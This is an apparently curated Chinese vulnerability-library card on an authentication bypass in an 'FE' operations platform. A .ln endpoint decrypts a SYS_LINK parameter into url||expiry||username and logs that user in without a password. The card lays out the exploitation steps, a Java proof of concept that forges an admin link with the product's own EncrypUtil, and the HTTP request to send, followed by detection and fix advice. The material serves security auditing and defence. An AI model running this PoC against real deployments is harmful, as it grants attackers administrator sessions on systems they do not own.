---
id: web-generic-auth-ln-sys-link-encrypted-string-login-bypass
title: FE 系统 .ln 接口 SYS_LINK 加密串构造登录：url||过期时间||admin 无口令进后台
type: scenario
domain: web
path: web/generic/auth
technique: fe-ln-sys-link-encrypted-link-login-bypass
aliases:
- SYS_LINK 登录绕过
- .ln 接口登录
- LinkUtil.getLinkMeta
- EncrypUtil 加密串登录
- 运营管理平台登录绕过
- link 免密登录
tags:
- java
- auth-bypass
- login
- filter
- code-audit
- encrypted-link
- session
cve: []
severity: critical
confidence: medium
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V603
  verified_at: '2026-11-12T18:23:20+08:00'
  notes: 已对照原文通读并逐张核对 29/29 图（web.xml 映射 *.ln、ControllerFilter5 三分支、LinkUtil.getLinkMeta、hexStringToBytes+EncrypUtil.decrypt、url||时间||用户 三段、ClassUtil 日期格式、IDEA 生成 hex 均与图文一致）。修正入口分支描述：.ln 判断位于 !uri.endsWith(".jsp") && !uri.endsWith(".xf") 成立后的非图片 else-if 内，并非 else 分支（staging 草稿同步修改）。未验证点：原文未给出 EncrypUtil 算法/密钥与登录成功响应截图，confidence medium 合理；与 op=D 卡共用 loginByCas 无口令链仅为同系统关联。dedup：top 候选为自身、同系统 op=D 卡（FeErpLoginServlet 固定 admin）与 esafenet LinkFilterService 加密串登录，入口与机制不同，非同链，保留。
---

## 一句话结论

FE 系统（某运营管理平台）的 ControllerFilter 对以 `.ln` 结尾的请求读取 `SYS_LINK` 参数：hex 解码后用 `EncrypUtil.decrypt` 解密并按 `||` 拆成 `url||过期时间||用户名`，过期时间合法时直接调用 `loginByCas(用户名)` 建立会话并跳转；攻击者拿到产品包里的 `EncrypUtil`（含密钥）后加密 `"/main/main.jsp||2025-01-01||admin"` 并转 hex，访问 `/任意.ln?SYS_LINK=<hex>` 即可以管理员身份登录。

## 原理

- **入口分支**：ControllerFilter5 的 doFilter 在 `!uri.endsWith(".jsp") && !uri.endsWith(".xf")` 成立后的非图片分支（`.do` 判断之后、排除 `.JPG/.JPEG/.GIF/.PNG` 的 else-if）中判断 `uri.endsWith(".ln")`，取出 `request.getParameter("SYS_LINK")`。
- **解析流程**：`LinkUtil.getLinkMeta(sys_link)`：
  1. `BaseFunc.hexStringToBytes(str)` 还原字节并转字符串；
  2. `EncrypUtil.decrypt(value)` 做对称解密；
  3. `split("\\|\\|")` 取出三段：`links[0]` = 跳转 url，`links[1]` = 过期时间（`ClassUtil.format(Date.class, links[1])` 按长度解析 `yyyy-MM-dd`、`yyyy-MM-dd HH:mm`、`yyyy-MM-dd HH:mm:ss`），`links[2]` = 用户名；
  4. 组装 `LinkMeta`（url/expired/User(userName)）。
- **登录判定**：Filter 中 `Date d = linkMeta.getExpired(); if (d == null || !d.before(new Date()))`——即未过期时执行 `userLoginService.loginByCas(linkMeta.getUser().getUserName(), request)`，随后 `response.sendRedirect(linkMeta.getUrl())`。`loginByCas → loginByUserName → getUserByName → login` 链路只按用户名查库，不校验口令（与同系统的 `FeErpLoginServlet op=D` 分支共用该链路）。
- **为什么可绕过**：解密后的用户名被视为已认证身份，但密文没有服务端签名/一次性凭证，加密算法与密钥随产品分发（源码、jar、安装包均可获得），攻击者可以任意构造明文并加密；时间字段只做“未过期”比较，填未来日期即可。
- **与 op=D 的区别**：`.fe/op=D` 是固定的调试分支直给 admin；`.ln` 是“加密链接跳转登录”功能，身份来自攻击者可控的密文，二者共用无口令登录链但入口与利用方式不同。

## 触发条件

- 目标部署该 FE 系统，ControllerFilter 映射覆盖 `*.ln`，`.ln` 请求可达。
- 攻击者能获得产品的 `EncrypUtil` 实现与其密钥（源码泄露、安装包/jar 下载、本地部署的同版本产品等）。
- 服务端时钟与构造的过期时间比较逻辑可控（填未来日期即满足）。
- 目标库中存在要登录的用户名（默认 `admin` 通常存在）。

## 利用步骤

1. 获取产品源码/安装包（jar）中的 `fe.util.EncrypUtil` 与 `BaseFunc`，确认对称加密算法与密钥。
2. 在本地引用同版本 jar 写一个小程序，构造明文并加密：
   ```java
   String en = EncrypUtil.encrypt("/main/main.jsp||2025-01-01||admin");
   String hex = BaseFunc.bytesToHexString(en.getBytes());
   System.out.println(hex);
   ```
3. 发送 `GET /main.ln?SYS_LINK=<hex>`（`.ln` 前面的路径任意，只要请求过 Filter）。
4. 服务端解密、校验时间未过期后以 `admin` 建立会话并 302 到 `/main/main.jsp`；带返回的 `JSESSIONID` 访问后台。
5. 若失败，检查：密钥/算法是否与目标版本一致、时间格式是否被 `ClassUtil.format` 正确解析、`admin` 用户是否存在、Filter 是否对该路径另有判断。

## PoC

```java
// 依赖目标产品的 fe.util.EncrypUtil / BaseFunc（同版本 jar）
public class fe {
    public static void main(String[] args) throws Exception {
        String en = EncrypUtil.encrypt("/main/main.jsp||2025-01-01||admin");
        String hex = BaseFunc.bytesToHexString(en.getBytes());
        System.out.println(hex);
    }
}
```

```http
GET /main.ln?SYS_LINK=<上面输出的 hex> HTTP/1.1
Host: target
```

说明：原文在 IDEA 中直接引用 `fe.util.EncrypUtil`/`BaseFunc` 生成 hex（明文 `/main/main.jsp||2025-01-01||admin`），并称访问 `/xxx.ln?SYS_LINK=hex` 即可进入后台；原文未展示明确的登录成功响应截图，且未给出 EncrypUtil 算法与密钥，需自行从产品包获取，故 confidence 标 medium。

## 变体与关联

- 变体：用户名换任意存在的账号（如系统管理员）；url 指向后台任意页面；时间格式按 `ClassUtil.format` 的长度分支选择（`yyyy-MM-dd`/带时分/带秒）。
- 变体：若加密串格式/算法随版本变化，按目标版本 jar 重新生成；密钥可能硬编码或从配置读取，优先从源码/配置定位。
- 关联：[[web-generic-auth-fe-login-opd-admin-session]]（同系统 `FeErpLoginServlet op=D` 固定 admin 登录，共用 loginByCas 无口令链，入口不同）；[[web-generic-auth-fe-controllerfilter5-excludepage-prefix-bypass]]（同一 ControllerFilter5 的前缀排除绕过）；[[web-java-framework-spring-custom-auth-path-parsing-bypass]]（同系统的 Filter 路径判断差异类问题）。
- 边界：`.ln` 功能被移除/增加服务端签名或一次性 token、密钥轮换且不随产品分发、过期时间强制校验且不允许未来时间、目标无对应用户名时失效。

## 检测与防御

- 修复：链接跳转登录必须使用服务端签发的一次性 token（带签名、绑定用户与有效期并在服务端存储/校验），不能仅凭对称加密串中的用户名认定身份；过期时间应由服务端生成并校验签发时间。
- 密钥管理：不要在产品包/客户端中固定分发加密密钥；支持轮换，敏感功能密钥单独管理。
- 检测：访问日志出现 `.ln` 且带 `SYS_LINK` 参数；同一来源短时间内多次 `.ln` 请求；登录日志中 `admin` 等账号通过非常规入口登录；解密后的 url/时间/用户名格式异常。
- 加固：对 `.ln` 接口限流与来源校验；禁用不使用的免密跳转登录；管理员账号启用 MFA。
